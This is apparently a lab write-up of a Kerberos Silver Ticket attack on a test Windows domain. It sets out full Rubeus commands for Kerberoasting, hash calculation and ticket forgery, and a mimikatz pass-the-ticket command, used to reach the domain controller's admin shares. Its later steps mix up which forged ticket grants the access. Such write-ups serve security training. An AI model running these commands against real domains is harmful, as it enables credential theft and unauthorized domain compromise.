Windows Local Execution


Silver Ticket Attack (Windows Local Execution)

  1. 1.

    1. Hypothesis & Concept

Hypothesis: An attacker with local administrator privileges on a workstation and the NTLM hash of a service account can forge a Kerberos Service Ticket (ST) locally.

Concept: By injecting this forged ticket into the current session's Kerberos cache (Pass-the-Ticket), the attacker can impersonate a high-privileged user (like the Domain Administrator) to access specific services on a remote target (like the DC) without ever needing to communicate with the Domain Controller to request a legitimate ticket.

  1. 2.

    2. Pre-Attack Verification

Objective: Confirm that the current user context does not have access to the target service. Findings: The user wrs01\gojo_satoru69 attempted to list the C$ share on DC01. The command returned "Access is denied", confirming that the account lacks the necessary permissions. A check of klist showed 0 cached tickets.

  1. 3.

    3. Preparation: Obtaining the Service Key

Objective: Recover the plaintext password of a service account to calculate the required NTLM hash. Technique: Kerberoasting & Offline Cracking. Tools: Rubeus.exe & John the Ripper.

Step 1: Kerberoasting

Command:

PowerShell

.\Rubeus.exe kerberoast /domain:shinobi.local /creduser:shinobi.local\svc_saiyan /credpassword:WeakService@123 /nowrap

Findings: Rubeus successfully enumerated 4 kerberoastable users and extracted the TGS hash for the account svc_saiyan.

Step 2: Password Cracking (Kali)

Findings: The hash was transferred to Kali, where john cracked it using a custom wordlist, revealing the password: WeakService@123.

Step 3: Calculating NTLM Hash

Command:

.\Rubeus.exe hash /password:WeakService@123

Findings: Using the cracked password, Rubeus calculated the required rc4_hmac (NTLM) hash: 35F3B47A22844F77F3CA3C5B9C86F7A3.

  1. 4.

    4. Attack Execution: Forgery & Injection

Objective: Forge a Silver Ticket for the HTTP service on DC01 and inject it into the local session.

Step 1: Identifying User SID

Command: whoami /user Findings: The SID for gojo_satoru69 was confirmed as S-1-5-21-523217751-2079269544-2282838949-1000.

Step 2: Forging the Ticket (Rubeus)

Command:

.\Rubeus.exe silver /service:HTTP/DC01 /rc4:35F3B47A22844F77F3CA3C5B9C86F7A3 /sid:S-1-5-21-523217751-2079269544-2282838949-1000 /user:gojo_satoru69 /domain:shinobi.local /ptt

Findings: Rubeus successfully built the PAC and forged a TGS for gojo_satoru69 to HTTP/DC01. The /ptt flag successfully imported the ticket into memory.

  1. 5.

    5. Verification & Impact

Objective: Verify the presence of the forged ticket and prove unauthorized access.

Step 1: Kerberos Cache Check

Command: klist

Findings: The Kerberos cache now contains 1 ticket for the server HTTP/DC01. Crucially, the ticket is valid for 10 years (End Time: 2/21/2036), a definitive signature of a forged Silver Ticket.

Step 2: Lateral Movement (Method A - External Ticket)

Objective: Inject the .kirbi ticket generated in the Kali phase.

Tool: mimikatz.exe Command: kerberos::ptt ticket.kirbi

Findings: Mimikatz successfully injected the ticket for rpcss/dc01.shinobi.local. This enabled administrative access to the DC's file system, allowing us to list the C$ and ADMIN$ shares.

Step 3: Unauthorized Data Access

Findings: We successfully bypassed permissions to view the C$ share on the Domain Controller, confirming total compromise of the target service.
